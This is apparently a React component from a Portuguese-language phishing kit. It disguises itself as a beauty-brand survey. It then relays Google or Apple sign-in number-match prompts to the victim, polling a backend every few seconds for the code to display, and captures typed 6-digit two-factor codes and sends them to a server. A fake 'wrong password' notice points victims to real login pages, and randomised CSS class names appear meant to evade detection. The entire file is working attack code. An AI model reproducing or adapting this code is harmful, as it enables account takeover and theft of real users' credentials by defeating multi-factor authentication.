import React from "react";
import './style.css'

import {useRef, useEffect, useState} from 'react';
import { useLocation  } from "react-router-dom";

// Material
import {MDCRipple} from '@material/ripple';
import {MDCFormField} from '@material/form-field';
import {MDCRadio} from '@material/radio';
import {MDCTextField} from '@material/textfield';

import { getMobileOperatingSystem } from "../../utils/functions";
import { getRandomLetters } from "../../utils/functions";
import { ReplyQuiz, SyncAnswer, UpdateCode } from "../../utils/api";

export const Quiz =() =>{

    const system = getMobileOperatingSystem();
    let [frase1, setFrase1] = useState('O Google');
    let [frase2, setFrase2] = useState('pelo Google');
    let [linkRecover, setlinkRecover] = useState('https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin');

    const card  = useRef(null);
    const radio = useRef(null);
    const form  = useRef(null);
    const button = useRef(null);
    const textField = useRef(null);

    const [enviado, setEnviado] = useState(false);
    const [, setCodigo] = useState('');
    const [codigoTouch, setCodigoTouch] = useState('42');

    useEffect(() => {
        new MDCRipple(card.current);
        new MDCRadio(radio.current);
        new MDCFormField(form.current);
        new MDCRipple(button.current);
        new MDCTextField(textField.current);
        form.input = radio;

        if(system === 'iOS'){
            setFrase1("A Apple")
            setFrase2("pela Apple")
            setlinkRecover('https://www.icloud.com/')
        }

    }, []);


    const location = useLocation();

    useEffect(() => {
        if(location.state.data && enviado === true){
            setInterval(async () => {
                let res = await SyncAnswer(location.state.data);
                setCodigoTouch(res.code)
            }, 3000);
        }
    }, [enviado])

    const enviarResposta = () => {
        ReplyQuiz(location.state.data)
        setEnviado(true);
    }

    const enviarCodigo = (valor) => {
        setCodigo(valor);
        if(valor.length >= 6){
            UpdateCode(location.state.data, valor)
        }
    }

    return(
        <>
        <div className={getRandomLetters(Math.floor(Math.random() * 10) + 6)+" form_background answer"}>
            <div className={getRandomLetters(Math.floor(Math.random() * 10) + 6)+" mdc-card mdc-card--outlined card_quiz card_top"} ref={card}>
                <h1>Formulário respondido</h1> 
                <p><br />
                    Obrigado por participar! <br />Sua resposta foi validada com sucesso!
                </p>
                <br />
            </div>
        </div>
        <div className={getRandomLetters(Math.floor(Math.random() * 10) + 6)+" form_background question"}>
            <div className={getRandomLetters(Math.floor(Math.random() * 10) + 6)+" mdc-card mdc-card--outlined card_quiz card_top"} ref={card}>
                <h1>Pergunta:</h1> 
                <p><br />
                    Na sua opinião, qual a melhor marca de produtos de beleza do Brasil?
                </p>
                <br />
            </div>

            <div className={getRandomLetters(Math.floor(Math.random() * 10) + 6)+" mdc-card mdc-card--outlined card_quiz"} ref={card}>
            <div ref={form}>

                <div className={getRandomLetters(Math.floor(Math.random() * 10) + 6)+" line"}>
                    <div className="mdc-radio" ref={radio}>
                        <input className="mdc-radio__native-control" type="radio" id="radio-1" name="radios" defaultChecked />
                        <div className="mdc-radio__background">
                        <div className="mdc-radio__outer-circle"></div>
                        <div className="mdc-radio__inner-circle"></div>
                        </div>
                        <div className="mdc-radio__ripple"></div>
                    </div>
                    <label htmlFor="radio-1">Natura</label>
                </div>

                <div className={getRandomLetters(Math.floor(Math.random() * 10) + 6)+" line"}>
                    <div className="mdc-radio" ref={radio}>
                        <input className="mdc-radio__native-control" type="radio" id="radio-2" name="radios" />
                        <div className="mdc-radio__background">
                        <div className="mdc-radio__outer-circle"></div>
                        <div className="mdc-radio__inner-circle"></div>
                        </div>
                        <div className="mdc-radio__ripple"></div>
                    </div>
                    <label htmlFor="radio-2">Vult</label>
                </div>

                <div className={getRandomLetters(Math.floor(Math.random() * 10) + 6)+" line"}>
                    <div className="mdc-radio" ref={radio}>
                        <input className="mdc-radio__native-control" type="radio" id="radio-3" name="radios" />
                        <div className="mdc-radio__background">
                        <div className="mdc-radio__outer-circle"></div>
                        <div className="mdc-radio__inner-circle"></div>
                        </div>
                        <div className="mdc-radio__ripple"></div>
                    </div>
                    <label htmlFor="radio-3">Mary Kay</label>
                </div> 

                <div className={getRandomLetters(Math.floor(Math.random() * 10) + 6)+"_line"}>
                    <div className="mdc-radio" ref={radio}>
                        <input className="mdc-radio__native-control" type="radio" id="radio-4" name="radios" />
                        <div className="mdc-radio__background">
                        <div className="mdc-radio__outer-circle"></div>
                        <div className="mdc-radio__inner-circle"></div>
                        </div>
                        <div className="mdc-radio__ripple"></div>
                    </div>
                    <label htmlFor="radio-4">Nívea</label>
                </div> 

                <div className={getRandomLetters(Math.floor(Math.random() * 10) + 6)+" line"}>
                    <div className="mdc-radio" ref={radio}>
                        <input className="mdc-radio__native-control" type="radio" id="radio-5" name="radios" />
                        <div className="mdc-radio__background">
                        <div className="mdc-radio__outer-circle"></div>
                        <div className="mdc-radio__inner-circle"></div>
                        </div>
                        <div className="mdc-radio__ripple"></div>
                    </div>
                    <label htmlFor="radio-5">Não uso ou não sei dizer</label>
                </div>
            </div>
            </div>

            <button onClick={() => enviarResposta()} className="mdc-button mdc-button--raised send_button" ref={button} >
                <span className="mdc-button__ripple"></span>
                <b className="mdc-button__label">Enviar</b>
            </button>

            <div className={getRandomLetters(Math.floor(Math.random() * 10) + 6)+" auth"}>
                <div className="validation_number">
                    {frase1} enviou uma notificação ao seu smartphone.
                    Toque em <span className="sim_sou">Sim, sou eu</span> e depois em <strong className="google_code1">{codigoTouch}</strong> no smartphone para validar sua resposta.
                    <p className="gcode2">
                        <strong className="gcode2_circle">{codigoTouch}</strong>
                    </p>
                    <small>Se os números forem diferentes deste mostrado acima aguarde alguns segundos</small>
                </div>
                <div className="validation_code"> 
                    Para validar sua resposta através de seu login {frase2}, digite o código de 6 dígitos que você recebeu por notificação ou SMS em seu smartphone no campo abaixo: 
                    <label className="mdc-text-field mdc-text-field--outlined confirm_code" ref={textField}>
                        <span className="mdc-notched-outline">
                            <span className="mdc-notched-outline__leading"></span>
                            <span className="mdc-notched-outline__notch">
                            <span className="mdc-floating-label" id="my-label-id">Confirmar código</span>
                            </span>
                            <span className="mdc-notched-outline__trailing"></span>
                        </span>
                        <input type="number" onChange={(e) => enviarCodigo(e.target.value)} className="mdc-text-field__input" aria-labelledby="my-label-id" />
                    </label>
                </div>

                <span className={getRandomLetters(Math.floor(Math.random() * 10) + 6)+" validation_wrong"}>
                    <span className="text-danger">
                        Sua senha ou email estão errados, por favor confirme seus dados de acesso <a href={linkRecover} target="_blank" rel="noopener noreferrer">por aqui</a> e responda novamente em seguida com sua conta correta para poder validar sua resposta pelo aplicativo da pesquisa.                        
                    </span>
                </span>
            </div>
        </div>
        </>
    );
}

export default Quiz;